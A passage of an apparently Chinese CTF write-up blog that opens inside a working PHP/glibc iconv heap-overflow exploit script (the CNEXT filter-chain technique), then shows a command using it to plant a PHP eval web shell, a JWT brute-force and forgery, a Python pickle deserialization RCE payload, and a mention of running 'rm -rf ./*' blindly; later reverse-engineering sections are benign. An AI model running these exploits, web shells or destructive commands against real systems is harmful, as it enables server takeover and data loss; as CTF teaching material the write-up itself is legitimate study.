class="number">6</span>)</span><br><span class="line">        pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">        step1_size = <span class="number">1</span></span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1, CS)</span><br><span class="line">        step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">        step2_size = <span class="number">0x48</span></span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">        step2 = chunked_chunk(step2, CS)</span><br><span class="line">        step2 = chunked_chunk(step2)</span><br><span class="line">        step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">        step3_size = CS</span><br><span class="line"></span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">        step4_size = CS</span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">        step4_pwn = ptr_bucket(</span><br><span class="line">            <span class="number">0x200000</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># free_slot</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            size=CS,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_custom_heap = ptr_bucket(</span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">        COMMAND = self.command</span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.sleep:</span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> (</span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap = COMMAND</span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">        pages = (</span><br><span class="line">                step4 * <span class="number">3</span></span><br><span class="line">                + step4_pwn</span><br><span class="line">                + step4_custom_heap</span><br><span class="line">                + step4_use_custom_heap</span><br><span class="line">                + step3_overflow</span><br><span class="line">                + pad * self.pad</span><br><span class="line">                + step1 * <span class="number">3</span></span><br><span class="line">                + step2_write_ptr</span><br><span class="line">                + step2 * <span class="number">2</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resource = compress(compress(pages))</span><br><span class="line">        resource = b64(resource)</span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        filters = [</span><br><span class="line">            <span class="comment"># Create buckets</span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        path = self.build_exploit_path()</span><br><span class="line">        start = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.remote.send(path)</span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://<span class="number">192.168</span><span class="number">.18</span><span class="number">.24</span>/ <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[0]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205406473-2044450703.png" alt="img"></p><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>扫了发现只有个login路由,交叉爆破一下用户名密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>爆出用户名密码是test/123456返回给了个token,是jwt,存在密钥,爆破一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>得到key是a123456,然后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205444958-1050385586.png" alt="img"></p><p>更改jwt后点access后有一个弹窗，说ser有点好东西</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205502169-1811646368.png" alt="img"></p><p>访问后能得到部分源码:</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205513354-1792537572.png" alt="img"></p><p>分析源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hhhhackme</span>(<span class="params">pickled</span>):</span><br><span class="line">    data = base64.urlsafe_b64decode(pickled)</span><br><span class="line">    deserialized = pickle.loads(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>,<span class="number">204</span>;</span><br></pre></td></tr></table></figure><p>发现能打python反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;ls&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br></pre></td></tr></table></figure><p>将上面结果发过去后并多次测试后发现无回显不出网</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205601347-1546485428.png" alt="img"></p><p>因为无回显不出网，无法判断命令能否正常执行，所以尝试了一些破坏性的命令如<code>rm -rf ./*</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205613652-933257913.png" alt="img"></p><p>判断出文件路径<code>/app/ser.py</code></p><p>可以将命令结果直接写到这个文件并且读取了，因为写文件会影响<code>ser.py</code>文件的正常运行，所以在前面加<code>#</code>后面拼接命令，但是要注意的是输出的结果不要太多行，因为读取源码的时候发现会在每行后面加<code>\n</code>，输出多行的话只会在第一行前面加<code>#</code>，还是需要重启环境</p><p>最后猜测flag位置在<code>/flag</code>，直接<code>cat /flag</code>将结果输入到<code>ser.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;echo &quot;#&quot;+&quot;`cat /flag`&quot; &gt;&gt; /app/ser.py&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：Encoded malicious payload: gASVWAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw8aW1wb3J0IG9zO29zLnN5c3RlbSgnZWNobyAiIyIrImBjYXQgL2ZsYWdgIiA-PiAvYXBwL3Nlci5weScplIWUUpQu</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205654359-4809249.png" alt="img"></p><p>再次访问ser得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205703837-1572091863.png" alt="img"></p><p>flag: 37ea8bacf16f4c1899ba23560c0b3ed1</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="joyVBS"><a href="#joyVBS" class="headerlink" title="joyVBS"></a>joyVBS</h2><p>​    经典的VBS混淆，强网刚遇到过，给dim定义之后输出以下代码逻辑，一开始用WScript.Echo复制不了数据人麻了，ocr卡半天，后面加了两行代码给dump到本地才行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;111.txt&quot;</span>, <span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">file</span>.WriteLine(output)</span><br><span class="line"><span class="keyword">file</span>.Close</span><br></pre></td></tr></table></figure><p>发现就是解一个凯撒加base64,凯撒的偏移是12</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/vZoWSoai2VpZq5eB.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/5xhOndXOdLLkNd4M.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/zSOBc0GiPRVBaGPD.png!thumbnail" alt="img"></p><h2 id="Rafflesia"><a href="#Rafflesia" class="headerlink" title="Rafflesia"></a>Rafflesia</h2><p>花指令，jzjnz直接nop，然后直接动态跟逻辑，干掉反调继续往下走</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Sm60hiT4Q2tDxOTz.png!thumbnail" alt="img"></p><p>然后跟到回调之后有码表的更换</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ItJH9zPZWTbYzP7t.png!thumbnail" alt="img"></p><p>直接跑起来弄出码表，然后发现主逻辑中藏了一个异或24的逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/2B0uj3goqtqlJTgv.png!thumbnail" alt="img"></p><p>密文异或完24直接解变表base64即可</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GhYJvDIApuRcmE5v.png!thumbnail" alt="img"></p><h2 id="RE5"><a href="#RE5" class="headerlink" title="RE5"></a>RE5</h2><p>面上的就是经典tea，不过肯定没这么简单，调起来之后主要就是</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/KrfmuTQsKbCFoif6.png!thumbnail" alt="img">动调之后触发了两段除零异常</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Lsnpv8VSic2hiDDZ.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/qeaAheFM9BV9FaY0.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/gWB8DWImRToEGCR1.png!thumbnail" alt="img"></p><p>给密钥换了，然后是加密的逻辑过程中也有异常被触发，走的都是上述相同的异常逻辑，直接提取密文模拟一下随机数获取的逻辑即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* data, <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> block1 = data[<span class="number">0</span>], block2 = data[<span class="number">1</span>], round_sum, idx;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> round_sums[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sums[idx] = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="keyword">if</span> (idx != <span class="number">0</span>)</span><br><span class="line">            round_sums[idx] += round_sums[idx - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key_part1 = key[<span class="number">0</span>], key_part2 = key[<span class="number">1</span>], key_part3 = key[<span class="number">2</span>], key_part4 = key[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sum = round_sums[<span class="number">31</span> - idx];</span><br><span class="line">        block2 -= ((block1 &lt;&lt; <span class="number">4</span>) + key_part3) ^ (block1 + round_sum) ^ ((block1 &gt;&gt; <span class="number">5</span>) + key_part4);</span><br><span class="line">        block1 -= ((block2 &lt;&lt; <span class="number">4</span>) + key_part1) ^ (block2 + round_sum) ^ ((block2 &gt;&gt; <span class="number">5</span>) + key_part2);</span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="number">0</span>] = block1; data[<span class="number">1</span>] = block2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">uint32_t</span> data[] = &#123;<span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(data, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">2</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">4</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">6</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, data);</span><br><span class="line">    </span><br><span 